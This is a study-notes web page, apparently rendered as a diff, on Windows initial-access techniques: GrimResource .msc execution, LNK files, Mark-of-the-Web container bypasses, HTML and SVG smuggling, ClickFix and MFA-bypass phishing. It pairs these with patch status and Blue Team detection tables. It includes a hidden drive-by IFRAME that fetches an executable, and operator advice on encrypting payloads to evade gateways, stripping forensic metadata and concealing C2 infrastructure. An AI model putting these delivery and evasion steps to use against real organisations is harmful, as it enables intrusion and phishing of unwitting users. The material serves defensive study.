+<li><strong>XSS and XSLT execution via apds.dll:</strong> A <code>.msc</code> is essentially XML text. By manipulating its <code>StringTable</code> section the technique triggers an XSS flaw in the Windows help library <code>apds.dll</code>, loading a URL-encoded XSL stylesheet (VBScript/JScript inside an <code>ms:script</code> tag) as <code>xsl.loadXML(unescape(...))</code> to run arbitrary code.</li>
+<li><strong>Auto-elevation benefit:</strong> <code>mmc.exe</code> is an auto-elevating binary per its manifest, so if the victim is in the local admin group, the payload runs at High Integrity (admin) right at initial access.</li>
+</ul>
+<h4 id="essential-update-grimresource-patch-status-and-constraints">[Essential update] GrimResource patch status and constraints<a class="headerlink" href="#essential-update-grimresource-patch-status-and-constraints" title="Permanent link">¶</a></h4>
+<ol>
+<li><strong>Officially patched by Microsoft (doesn't work on current builds):</strong> After disclosure, Microsoft patched the root cause in regular updates (e.g. late-2024 cumulative updates) so <code>mmc.exe</code>/<code>apds.dll</code> won't process abnormal external resources or inline scripts. <strong>On patched Win 10 (22H2) and Win 11 (23H2/24H2) it no longer works.</strong></li>
+<li><strong>Thoroughly detected by EDR:</strong> An office user running a <code>.msc</code> is itself unusual, and <code>mmc.exe</code> loading <code>apds.dll</code> then spawning a child process (<code>cmd.exe</code> etc.) or loading the .NET CLR is blocked immediately by major EDR.</li>
+</ol>
+<h3 id="compatibility-patch-matrix-part-3-assessment">[Compatibility &amp; patch matrix] Part 3 assessment<a class="headerlink" href="#compatibility-patch-matrix-part-3-assessment" title="Permanent link">¶</a></h3>
+<table>
+<thead>
+<tr>
+<th>Trigger format</th>
+<th>Target OS</th>
+<th>Impact of recent patches</th>
+<th>Blue Team / DFIR detection focus</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Batch (<code>.bat</code>, <code>.cmd</code>)</td>
+<td><strong>All Windows versions</strong></td>
+<td>The <code>%cmdcmdline%</code> trick can still evade older sandboxes. But modern EDR sandboxes simulate the Explorer click event and defeat it.</td>
+<td><strong>Event ID 4688 / Sysmon 1:</strong> <code>cmd.exe</code> with <code>find /i</code> + env-variable combos. Block batch files running from ISO/archive mount paths (<code>D:\</code>, <code>E:\</code>, <code>%TEMP%</code>).</td>
+</tr>
+<tr>
+<td>Shell Link (<code>.lnk</code>)</td>
+<td><strong>All Windows versions</strong> (Explorer native)</td>
+<td><code>NeverShowExt</code> extension hiding is identical on all versions. <strong>CVE-2023-36025 / CVE-2024-21412</strong> patched many SmartScreen-bypass bugs.</td>
+<td>Alert when a <code>.lnk</code>'s <code>Target</code> points at a system interpreter (<code>cmd</code>, <code>powershell</code>, <code>mshta</code>, <code>rundll32</code>). Extract timestamps and the attacker's <code>MachineID</code>/<code>MAC</code> artifacts from inside the <code>.lnk</code> (DFIR).</td>
+</tr>
+<tr>
+<td>MS Saved Console (<code>.msc</code> — GrimResource)</td>
+<td>Unpatched Win 10/11 only</td>
+<td><strong>Patched on current cumulative updates — no longer works.</strong> Directly affected by the gradual VBScript deprecation.</td>
+<td><strong>Sysmon ID 7 (ImageLoad):</strong> <code>mmc.exe</code> abnormally loading <code>apds.dll</code>, <code>mshtml.dll</code>, <code>vbscript.dll</code>, <code>jscript.dll</code> in sequence. Static detection of <code>apds://</code> or <code>loadXML</code> strings in the <code>.msc</code> XML (YARA).</td>
+</tr>
+</tbody>
+</table>
+<h3 id="blue-team-dfir-deep-dive-lnk-forensic-artifacts-opsec">[Blue Team / DFIR deep dive] LNK forensic artifacts (OPSEC)<a class="headerlink" href="#blue-team-dfir-deep-dive-lnk-forensic-artifacts-opsec" title="Permanent link">¶</a></h3>
+<p>When you create a <code>.lnk</code> with PowerShell (<code>WScript.Shell</code>), Windows writes <strong>the creating computer's NetBIOS hostname, volume serial, and even MAC address</strong> into the <code>.lnk</code> binary structure (the <code>DistributedLinkTrackerBlock</code> in the <code>ExtraData</code> block).</p>
+<ul>
+<li><strong>Defender (DFIR) view:</strong> Analysing a recovered <code>.lnk</code> with <code>LECmd</code> (Eric Zimmerman's tool) can pin down the attacker's build-environment computer name and timestamps.</li>
+<li><strong>Operator (OPSEC) view:</strong> When creating a <code>.lnk</code> for a target, strip the metadata (<code>TrackerDataBlock</code>) with a tool or build it in a disposable clean VM, to avoid leaking internal infrastructure details.</li>
+</ul>
+<hr>
+<p><a id="containers"></a></p>
+<h1 id="chapter-4-containers-and-motw-bypass">Chapter 4. Containers (and MotW bypass)<a class="headerlink" href="#chapter-4-containers-and-motw-bypass" title="Permanent link">¶</a></h1>
+<h3 id="41-mark-of-the-web-motw-structure-and-role">4.1 Mark of the Web (MotW) — structure and role<a class="headerlink" href="#41-mark-of-the-web-motw-structure-and-role" title="Permanent link">¶</a></h3>
+<p>MotW is a security identifier that Windows (or a browser/mail client) automatically attaches to files downloaded from the internet or an untrusted zone.</p>
+<ul>
+<li><strong>NTFS Alternate Data Stream (ADS):</strong> NTFS can store hidden extra streams alongside a file's main data (<code>:$DATA</code>). On download, the browser creates a <code>Zone.Identifier</code> ADS recording the origin.</li>
+</ul>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a><span class="nb">PS </span><span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">Analyst</span><span class="p">\</span><span class="n">Downloads</span><span class="p">&gt;</span> <span class="nb">Get-Content</span> <span class="n">-Stream</span> <span class="n">Zone</span><span class="p">.</span><span class="n">Identifier</span> <span class="p">.\</span><span class="n">test</span><span class="p">.</span><span class="n">pdf</span>
+</span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a>
+</span><span id="__span-10-3"><a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a><span class="no">[ZoneTransfer]</span>
+</span><span id="__span-10-4"><a id="__codelineno-10-4" name="__codelineno-10-4" href="#__codelineno-10-4"></a><span class="n">ZoneId</span><span class="p">=</span><span class="n">3</span>
+</span><span id="__span-10-5"><a id="__codelineno-10-5" name="__codelineno-10-5" href="#__codelineno-10-5"></a><span class="n">ReferrerUrl</span><span class="p">=</span><span class="n">https</span><span class="p">://.../</span><span class="n">test</span><span class="p">.</span><span class="n">pdf</span>
+</span><span id="__span-10-6"><a id="__codelineno-10-6" name="__codelineno-10-6" href="#__codelineno-10-6"></a><span class="n">HostUrl</span><span class="p">=</span><span class="n">https</span><span class="p">://.../</span><span class="n">test</span><span class="p">.</span><span class="n">pdf</span>
+</span></code></pre></div>
+<ul>
+<li><strong><code>ZoneId</code> meanings:</strong> <code>0</code> Local Machine · <code>1</code> Local Intranet · <code>2</code> Trusted Sites · <strong><code>3</code> Internet (applied to external downloads) ⭐</strong> · <code>4</code> Restricted Sites</li>
+</ul>
+<p>With a <code>ZoneId=3</code> tag, the file Properties window shows a "this file came from another computer and may be blocked" warning; Windows forces <strong>SmartScreen</strong> on executables and applies Protected View (blocking macros) to Office documents.</p>
+<h3 id="42-purpose-and-packaging-of-containers">4.2 Purpose and packaging of containers<a class="headerlink" href="#42-purpose-and-packaging-of-containers" title="Permanent link">¶</a></h3>
+<ol>
+<li><strong>Bundling and hiding multiple files:</strong> Dependencies like the trigger (<code>.lnk</code>), payload (<code>.dll</code>/<code>.xlam</code>), and decoy (<code>.pdf</code>/<code>.xlsx</code>) are bundled into one package. A tool like <code>PackMyPayload</code> with its <code>-H</code> option sets the <strong>hidden attribute</strong> on inner files so the victim sees only the trigger when they open the container.</li>
+<li><strong>Blocking MotW propagation:</strong> The container itself (e.g. <code>test.iso</code>) carries MotW (<code>ZoneId=3</code>) as a download, but the traditional core trick was to launder (strip) MotW by exploiting the gap where older archive/mount tools <strong>don't copy the <code>Zone.Identifier</code> stream to the individual inner files</strong> on extraction.</li>
+</ol>
+<h3 id="43-essential-update-per-format-motw-propagation-patch-status-win-10-11">4.3 [Essential update] Per-format MotW propagation patch status (Win 10 / 11)<a class="headerlink" href="#43-essential-update-per-format-motw-propagation-patch-status-win-10-11" title="Permanent link">¶</a></h3>
+<p>The course says mounting a <code>.iso</code>/<code>.img</code> removes MotW from inner files — but <strong>this is the area that changed most dramatically</strong> due to Microsoft patches.</p>
+<table>
+<thead>
+<tr>
+<th>Container format</th>
+<th>Native Windows support</th>
+<th>Past behaviour (per course)</th>
+<th>Current OS behaviour (Win 10 22H2 / Win 11 22H2~24H2)</th>
+<th>Current viability</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>.iso</code>, <code>.img</code> (optical disc image)</td>
+<td>Yes (double-click mounts a virtual DVD)</td>
+<td>ISO internals are ISO-9660/UDF, not NTFS, so no ADS → inner-file MotW disappears.</td>
+<td><strong>[Patched — CVE-2022-41091 etc.]</strong> If a mounted ISO/IMG original has MotW, the kernel driver <strong>auto-inherits MotW (<code>ZoneId=3</code>) onto all files inside the mounted virtual drive.</strong></td>
+<td><strong>[MotW bypass gone]</strong> Still usable to bundle and hide files, but no longer works for MotW laundering.</td>
+</tr>
+<tr>
+<td><code>.vhd</code>, <code>.vhdx</code> (virtual hard disk)</td>
+<td>Yes (double-click mounts a virtual disk)</td>
+<td>Recognised as a separate local disk, so MotW didn't propagate — a popular bypass.</td>
+<td><strong>[Patched]</strong> Like ISO, a VHDMP driver update propagates the original VHD's MotW onto files inside the mounted volume.</td>
+<td><strong>[Low]</strong> VHD mounts in a normal office environment raise immediate EDR alerts.</td>
+</tr>
+<tr>
+<td><code>.zip</code> (standard archive)</td>
+<td>Yes (built into Explorer)</td>
+<td>Explorer extraction propagated MotW, but 7-Zip/WinRAR extraction dropped it.</td>
+<td><strong>[Hardened]</strong> Explorer still propagates. Current WinRAR and 7-Zip (with the option on) were patched to propagate MotW on extraction too.</td>
+<td><strong>[Medium]</strong> Less for MotW bypass, more as a <strong>password-protected ZIP</strong> to evade static scanning at the email gateway — still widely used.</td>
+</tr>
+<tr>
+<td><code>.7z</code>, <code>.rar</code>, <code>.tar</code>, <code>.gz</code></td>
+<td><strong>Yes (built in since Win 11 23H2 ⭐)</strong></td>
+<td>Not natively supported before — couldn't open without a separate archiver.</td>
+<td><strong>[Big Win 11 change]</strong> Since Win 11 (23H2+), open-source <code>libarchive</code> is built into Explorer, so these extract natively without extra software.</td>
+<td><strong>[High — new research target]</strong> Early <code>libarchive</code> integration had bugs that dropped MotW on certain formats (CVE-2024-21410 etc.); an ongoing patch target.</td>
+</tr>
+<tr>
+<td><code>.wim</code> (Windows Imaging)</td>
+<td>Partial (openable with 7-Zip etc.)</td>
+<td>Usable for file packaging.</td>
+<td>A normal user can't mount it with a double-click; only viable where a third-party archiver is installed.</td>
+<td><strong>[Low]</strong> Low usability, so only for limited targets.</td>
+</tr>
+</tbody>
+</table>
+<hr>
+<p><a id="delivery"></a></p>
+<h1 id="chapter-5-delivery-perimeter-bypass-payload-delivery">Chapter 5. Delivery (perimeter bypass &amp; payload delivery)<a class="headerlink" href="#chapter-5-delivery-perimeter-bypass-payload-delivery" title="Permanent link">¶</a></h1>
+<p>Delivery is getting the finished package (container) past the target's layered perimeter (firewall, email gateway, web proxy, network sandbox) to the victim endpoint undetected.</p>
+<h3 id="51-html-smuggling">5.1 HTML Smuggling<a class="headerlink" href="#51-html-smuggling" title="Permanent link">¶</a></h3>
+<h4 id="core-idea_8">Core idea<a class="headerlink" href="#core-idea_8" title="Permanent link">¶</a></h4>
+<p>Traditionally you host a malicious file on a web server and get the victim to click a download link — but then the packet's MIME type and the file's binary body are exposed to the web proxy/security appliance and blocked. <strong>HTML Smuggling</strong> combines HTML5 (the <code>download</code> attribute) with JavaScript (the <code>Blob</code> API) to <strong>assemble the file directly in the victim's browser memory, generating no binary-transfer traffic on the network.</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>[Traditional download vs. HTML Smuggling network traffic]
+</span><span id="__span-11-2"><a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a>
+</span><span id="__span-11-3"><a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a>❌ Traditional download:
+</span><span id="__span-11-4"><a id="__codelineno-11-4" name="__codelineno-11-4" href="#__codelineno-11-4"></a>[Attacker web server] ─(HTTP: application/octet-stream + malicious binary)─&gt; [proxy/firewall] 💥 blocked
+</span><span id="__span-11-5"><a id="__codelineno-11-5" name="__codelineno-11-5" href="#__codelineno-11-5"></a>
+</span><span id="__span-11-6"><a id="__codelineno-11-6" name="__codelineno-11-6" href="#__codelineno-11-6"></a>✅ HTML Smuggling:
+</span><span id="__span-11-7"><a id="__codelineno-11-7" name="__codelineno-11-7" href="#__codelineno-11-7"></a>[Attacker web server] ─(HTTP: text/html + ordinary text/JS string)─&gt; [proxy passes] ─&gt; [victim browser]
+</span><span id="__span-11-8"><a id="__codelineno-11-8" name="__codelineno-11-8" href="#__codelineno-11-8"></a>                                                                                │
+</span><span id="__span-11-9"><a id="__codelineno-11-9" name="__codelineno-11-9" href="#__codelineno-11-9"></a>                                                        ┌───────────────────────┘
+</span><span id="__span-11-10"><a id="__codelineno-11-10" name="__codelineno-11-10" href="#__codelineno-11-10"></a>                                                        ▼
+</span><span id="__span-11-11"><a id="__codelineno-11-11" name="__codelineno-11-11" href="#__codelineno-11-11"></a>                                             [JS runs inside the browser]
+</span><span id="__span-11-12"><a id="__codelineno-11-12" name="__codelineno-11-12" href="#__codelineno-11-12"></a>                                             1. Decode Base64/encrypted string (atob / Web Crypto API)
+</span><span id="__span-11-13"><a id="__codelineno-11-13" name="__codelineno-11-13" href="#__codelineno-11-13"></a>                                             2. Convert to Uint8Array, build a Blob object
+</span><span id="__span-11-14"><a id="__codelineno-11-14" name="__codelineno-11-14" href="#__codelineno-11-14"></a>                                             3. Create a hidden &lt;a&gt; tag and auto-click to drop the file locally
+</span></code></pre></div>
+<p>Flow: ① encode the container (e.g. <code>.iso</code>/<code>.zip</code>) as Base64 and embed it as text in a JS variable in the HTML → ② the proxy sees only plain text (HTML/JS) and passes it → ③ in the browser, decode with <code>atob()</code>, convert to <code>Uint8Array</code>, and build a <code>Blob</code> → ④ create a local object URL with <code>URL.createObjectURL()</code> and auto-click a hidden <code>&lt;a&gt;</code> to drop the file into Downloads.</p>
+<h4 id="advanced-detection-by-modern-appliances-and-evasion">[Advanced] Detection by modern appliances, and evasion<a class="headerlink" href="#advanced-detection-by-modern-appliances-and-evasion" title="Permanent link">¶</a></h4>
+<ul>
+<li><strong>Detection today:</strong> Modern email gateways and NGFWs flag HTML Smuggling statically when they see combinations of <code>atob</code>, <code>Uint8Array</code>, <code>Blob</code>, <code>msSaveOrOpenBlob</code>, <code>createObjectURL</code>, and they can decode Base64 strings themselves.</li>
+<li><strong>Evasion:</strong> ① Instead of plain Base64, encrypt the payload (e.g. <strong>AES-GCM</strong>) and decrypt at runtime in the browser with <code>crypto.subtle.decrypt()</code> — without the key the appliance can't tell what the file is. ② Obfuscate the key API strings, or split the payload into chunks pulled from external JSON / image metadata and reassembled, to evade static signatures.</li>
+</ul>
+<h3 id="52-svg-smuggling">5.2 SVG Smuggling<a class="headerlink" href="#52-svg-smuggling" title="Permanent link">¶</a></h3>
+<p>SVG is an <strong>XML-based text image format</strong>, and the standard allows a <code>&lt;script&gt;</code> tag with executable JavaScript directly inside the image.</p>
+<div class="language-xml highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a><span class="nt">&lt;svg</span><span class="w"> </span><span class="na">width=</span><span class="s">"100"</span><span class="w"> </span><span class="na">height=</span><span class="s">"100"</span><span class="w"> </span><span class="na">xmlns=</span><span class="s">"http://www.w3.org/2000/svg"</span><span class="nt">&gt;</span>
+</span><span id="__span-12-2"><a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a><span class="w">  </span><span class="nt">&lt;circle</span><span class="w"> </span><span class="na">cx=</span><span class="s">"50"</span><span class="w"> </span><span class="na">cy=</span><span class="s">"50"</span><span class="w"> </span><span class="na">r=</span><span class="s">"40"</span><span class="w"> </span><span class="na">stroke=</span><span class="s">"black"</span><span class="w"> </span><span class="na">stroke-width=</span><span class="s">"4"</span><span class="w"> </span><span class="na">fill=</span><span class="s">"none"</span><span class="w"> </span><span class="nt">/&gt;</span>
+</span><span id="__span-12-3"><a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a><span class="w">  </span><span class="nt">&lt;script&gt;</span>
+</span><span id="__span-12-4"><a id="__codelineno-12-4" name="__codelineno-12-4" href="#__codelineno-12-4"></a><span class="w">    </span>//<span class="w"> </span>The<span class="w"> </span>moment<span class="w"> </span>the<span class="w"> </span>SVG<span class="w"> </span>opens<span class="w"> </span>in<span class="w"> </span>a<span class="w"> </span>browser,<span class="w"> </span>inner<span class="w"> </span>JS<span class="w"> </span>(e.g.<span class="w"> </span>HTML<span class="w"> </span>Smuggling<span class="w"> </span>logic)<span class="w"> </span>runs<span class="w"> </span>—<span class="w"> </span>PoC
+</span><span id="__span-12-5"><a id="__codelineno-12-5" name="__codelineno-12-5" href="#__codelineno-12-5"></a><span class="w">    </span>alert('Hello<span class="w"> </span>World');
+</span><span id="__span-12-6"><a id="__codelineno-12-6" name="__codelineno-12-6" href="#__codelineno-12-6"></a><span class="w">  </span><span class="nt">&lt;/script&gt;</span>
+</span><span id="__span-12-7"><a id="__codelineno-12-7" name="__codelineno-12-7" href="#__codelineno-12-7"></a><span class="nt">&lt;/svg&gt;</span>
+</span></code></pre></div>
+<ul>
+<li><strong>Delivery/execution advantage:</strong> Many organisations block <code>.html</code>/<code>.htm</code> attachments, but <code>.svg</code> is classified as an image and often passes the filter. On Windows the default handler for <code>.svg</code> is <strong>Microsoft Edge</strong>, so a victim who double-clicks the "image" opens Edge and the hidden JavaScript runs.</li>
+</ul>
+<h3 id="53-cobalt-strike-site-clone-drive-by-download">5.3 Cobalt Strike Site Clone &amp; Drive-By Download<a class="headerlink" href="#53-cobalt-strike-site-clone-drive-by-download" title="Permanent link">¶</a></h3>
+<p>Instead of standing up Apache/Nginx and planting smuggling code, this uses the <strong>Cobalt Strike</strong> C2 framework's built-in web server and <strong>Site Cloner</strong> to quickly build a phishing site and drive-by download.</p>
+<p>Setup outline: ① <strong>Host File</strong> uploads the package to the team server's web server with a realistic-looking <code>Local URI</code> and a typosquatted domain → ② <strong>Clone Site</strong> clones a real site and sets <code>Attack</code> to the malicious file URL (cloning a login page can also log keystrokes) → ③ a size-<code>0</code> invisible <code>&lt;IFRAME&gt;</code> is injected at the bottom of the cloned page so merely visiting triggers the download.</p>
+<div class="language-html highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a><span class="p">&lt;</span><span class="nt">IFRAME</span> <span class="na">SRC</span><span class="o">=</span><span class="s">"http://.../GPU-Z.2.22.0.exe?id=null"</span> <span class="na">WIDTH</span><span class="o">=</span><span class="s">"0"</span> <span class="na">HEIGHT</span><span class="o">=</span><span class="s">"0"</span><span class="p">&gt;&lt;/</span><span class="nt">IFRAME</span><span class="p">&gt;</span>
+</span></code></pre></div>
+<h4 id="recent-patches-and-opsec-important">Recent patches and OPSEC (important ⭐)<a class="headerlink" href="#recent-patches-and-opsec-important" title="Permanent link">¶</a></h4>
+<p>Applying the course's Cobalt Strike lab as-is will mostly fail or be blocked immediately.</p>
+<ol>
+<li><strong>The end of HTTP (port 80) and mixed-content blocking:</strong> Modern Chrome/Edge warn on plain-HTTP sites and silently block an HTTPS page's hidden HTTP <code>&lt;iframe&gt;</code> auto-downloading an executable as an 'insecure download' / 'drive-by'. A valid SSL/TLS cert (Let's Encrypt etc.) on HTTPS (443) is mandatory.</li>
+<li><strong>Team-server fingerprinting and mandatory redirector:</strong> Cobalt Strike's built-in web server has distinctive HTTP response headers / default error pages, so Shodan/Censys or threat intel exposes the team server IP immediately. Never expose the team server directly — put an Apache/Nginx or Cloudflare Workers redirector in front to filter and forward only legitimate traffic and hide the infrastructure.</li>
+</ol>
+<hr>
+<p><a id="trends"></a></p>
+<h1 id="appendix-20252026-current-initial-access-trends">Appendix. 2025~2026 current initial-access trends<a class="headerlink" href="#appendix-20252026-current-initial-access-trends" title="Permanent link">¶</a></h1>
+<p>Beyond file-based phishing, the three techniques most actively used by current operators and real threat groups (APT, ransomware):</p>
+<h3 id="61-device-code-phishing-aitm-mfa-bypass-phishing">6.1 Device Code Phishing &amp; AiTM (MFA-bypass phishing)<a class="headerlink" href="#61-device-code-phishing-aitm-mfa-bypass-phishing" title="Permanent link">¶</a></h3>
+<ul>
+<li><strong>Background:</strong> With cloud migration (Microsoft 365, Entra ID) and MFA adoption, <strong>stealing cloud session tokens</strong> has exploded as an initial-access path, over running malware.</li>
+<li><strong>AiTM (Adversary-in-the-Middle):</strong> A reverse-proxy phishing framework like <code>Evilginx</code> intercepts the session cookie (<code>ESTSAUTH</code> etc.) the moment the victim completes MFA on a fake login page, neutralising MFA.</li>
+<li><strong>Device Code Phishing:</strong> Abuses the OAuth 2.0 device-authorization flow used for smart-TV/IoT login. The attacker first requests a code, then tells the victim to "go to Microsoft's official auth page and enter this code." The victim enters it on <strong>Microsoft's genuine domain</strong>, bypassing proxies and phishing detection, and the attacker's tooling (<code>TokenTactics</code> etc.) receives the access and refresh tokens the moment auth completes.</li>
+</ul>
+<h3 id="62-microsoft-teams-external-tenant-phishing-clickfix">6.2 Microsoft Teams (external tenant) phishing &amp; ClickFix<a class="headerlink" href="#62-microsoft-teams-external-tenant-phishing-clickfix" title="Permanent link">¶</a></h3>
+<ul>
+<li><strong>Teams phishing:</strong> With email gateways now so strong, attackers impersonate internal helpdesk via <strong>Teams</strong> (external-tenant chat is allowed by default) to message victims directly with malicious links/payloads.</li>
+<li><strong>ClickFix:</strong> A technique surging recently. A fake prompt ("to view this document you need to update / prove you're not a robot") instructs the victim to paste a clipboard-loaded, obfuscated PowerShell/Mshta command into <code>Win + R</code> and run it themselves. <strong>Because a command the user types into Run never goes through download (MotW) or email-attachment checks,</strong> it fully bypasses perimeter security.</li>
+</ul>
+<h3 id="63-edge-device-zero-days-abuse-of-remote-rmm-tools">6.3 Edge-device zero-days &amp; abuse of remote RMM tools<a class="headerlink" href="#63-edge-device-zero-days-abuse-of-remote-rmm-tools" title="Permanent link">¶</a></h3>
+<ul>
+<li><strong>Edge-device exploits:</strong> Instead of phishing, attackers hit vulnerabilities in exposed enterprise VPN/firewall/file-transfer appliances (Ivanti, Fortinet, Palo Alto, Citrix) to plant web shells/backdoors on EDR-less Linux appliances and pivot inside.</li>
+<li><strong>Pushing legitimate RMM installs:</strong> Since custom C2 beacons risk EDR detection, initial access increasingly drops a fully legitimate, signed commercial RMM installer (AnyDesk, ScreenConnect, Atera, Action1) and has the victim run it, then takes the foothold over a legitimate remote-control channel.</li>
+</ul>
+<hr>
+<h2 id="final-summary-blue-team-dfir-initial-access-defence-checklist">[Final summary] Blue Team / DFIR initial-access defence checklist<a class="headerlink" href="#final-summary-blue-team-dfir-initial-access-defence-checklist" title="Permanent link">¶</a></h2>
+<table>
+<thead>
+<tr>
+<th>Defence layer</th>
+<th>Techniques addressed</th>
+<th>Actionable defence &amp; detection</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1. Network &amp; browser</td>
+<td>HTML/SVG Smuggling, Drive-by, AiTM/Device Code phishing</td>
+<td>Block <code>.svg</code>, <code>.iso</code>, <code>.img</code>, <code>.vhd</code>, <code>.lnk</code>, <code>.msc</code> outright at the email gateway and web proxy. Enterprise browser policy (GPO/Intune) to block auto-downloads of executables on non-work sites. <strong>FIDO2 phishing-resistant MFA (passkeys / hardware keys)</strong> + conditional access (login only from registered devices).</td>
+</tr>
+<tr>
+<td>2. OS &amp; container</td>
+<td>ISO/VHD mount, LNK/BAT/MSC triggers, ClickFix (<code>Win+R</code>)</td>
+<td>GPO to disable auto-mount handlers for <code>.iso</code>/<code>.vhd</code> and centrally collect <code>Microsoft-Windows-VHDMP-Operational</code> (Event ID 1, 12). Monitor registry <code>RunMRU</code> for <code>powershell</code>/<code>mshta</code>/<code>cmd</code>/<code>curl</code> typed directly into <code>Win+R</code> (ClickFix).</td>
+</tr>
+<tr>
+<td>3. Endpoint &amp; process</td>
+<td>DLL Side-Loading, AppDomainManager, MSI/XLAM/RMM abuse</td>
+<td>Enable <strong>Defender ASR rules</strong> broadly (block Office child processes, restrict WMI/PsExec, etc.). Use <strong>WDAC</strong> or AppLocker to block unsigned binaries and unapproved RMM in user-writable paths (<code>C:\ProgramData</code>, <code>%APPDATA%</code>, <code>%TEMP%</code>). Hunt for signed binaries whose <code>OriginalFilename</code> differs from the process name, or that load unsigned DLLs from unusual paths (Sysmon ID 7).</td>
+</tr>
+</tbody>
+</table>
+<hr>
+<p><em>This page is a personal reference re-organised from CRTO study notes, for Blue Team / DFIR learning (detection and defence).</em></p>
+
+
+
+
+
+
+
+  
+  
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+  <script>var tabs=__md_get("__tabs");if(Array.isArray(tabs))e:for(var set of document.querySelectorAll(".tabbed-set")){var labels=set.querySelector(".tabbed-labels");for(var tab of tabs)for(var label of labels.getElementsByTagName("label"))if(label.innerText.trim()===tab){var input=document.getElementById(label.htmlFor);input.checked=!0;continue e}}</script>
+
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden="">
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"></path></svg>
+  Back to top
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+    
+      
+      <nav class="md-footer__inner md-grid" aria-label="Footer">
+        
+          
+          <a href="../" class="md-footer__link md-footer__link--prev" aria-label="Previous: Red Team">
+            <div class="md-footer__button md-icon">
+              
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"></path></svg>
+            </div>
+            <div class="md-footer__title">
+              <span class="md-footer__direction">
+                Previous
+              </span>
+              <div class="md-ellipsis">
+                Red Team
+              </div>
+            </div>
+          </a>
+        
+        
+          
+          <a href="../../threat-intel/" class="md-footer__link md-footer__link--next" aria-label="Next: Threat Intelligence">
+            <div class="md-footer__title">
+              <span class="md-footer__direction">
+                Next
+              </span>
+              <div class="md-ellipsis">
+                Threat Intelligence
+              </div>
+            </div>
+            <div class="md-footer__button md-icon">
+              
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11z"></path></svg>
+            </div>
+          </a>
+        
+      </nav>
+    
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+    <div class="md-copyright__highlight">
+      Personal study notes. Not official guidance of any organisation.
+    </div>
+  
+  
+</div>
+      
+        
+<div class="md-social">
+  
+    
+    
+    
+    
+      
+      
+    
+    <a href="https://github.com/DFIDwiz-sketch" target="_blank" rel="noopener" title="github.com" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M173.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M252.8 8C114.1 8 8 113.3 8 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C436.2 457.8 504 362.9 504 252 504 113.3 391.5 8 252.8 8M105.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 